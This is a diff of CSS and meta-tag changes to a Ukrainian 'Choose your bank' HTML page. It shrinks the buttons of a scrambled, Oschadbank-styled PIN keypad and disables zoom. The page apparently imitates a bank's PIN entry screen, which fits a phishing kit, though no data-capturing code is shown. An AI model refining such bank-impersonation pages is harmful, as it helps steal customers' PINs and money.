@@ -2,7 +2,7 @@
 <html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Оберіть свій банк</title>
     <style>
         /* Общие стили для всех экранов и элементов */
@@ -280,7 +280,7 @@
         }
         .oschad-pin-dots-container {
             display: flex; justify-content: center; gap: 20px;
-            margin-bottom: 40px;
+            margin-bottom: 30px; /* ИЗМЕНЕНО: Уменьшен отступ для экономии места */
         }
         .oschad-pin-dot {
             width: 50px; height: 50px; border-radius: 8px;
@@ -303,10 +303,12 @@
                 "k7 k3 k2"
                 "k0 k1 k5"
                 ". k4 backspace";
-            gap: 15px; width: 100%; max-width: 320px; margin: auto 0 20px 0;
+            gap: 10px; /* ИЗМЕНЕНО: Уменьшен зазор */
+            width: 100%; max-width: 320px; margin: auto 0 20px 0;
         }
         .oschad-pin-key {
-            height: 75px; width: 75px; justify-self: center;
+            height: 65px; width: 65px; /* ИЗМЕНЕНО: Уменьшен размер кнопок */
+            justify-self: center;
             border-radius: 50%; border: none; background-color: #f0f2f5;
             display: flex; align-items: center; justify-content: center;
             font-size: 28px; font-weight: 400; color: var(--dark-text);
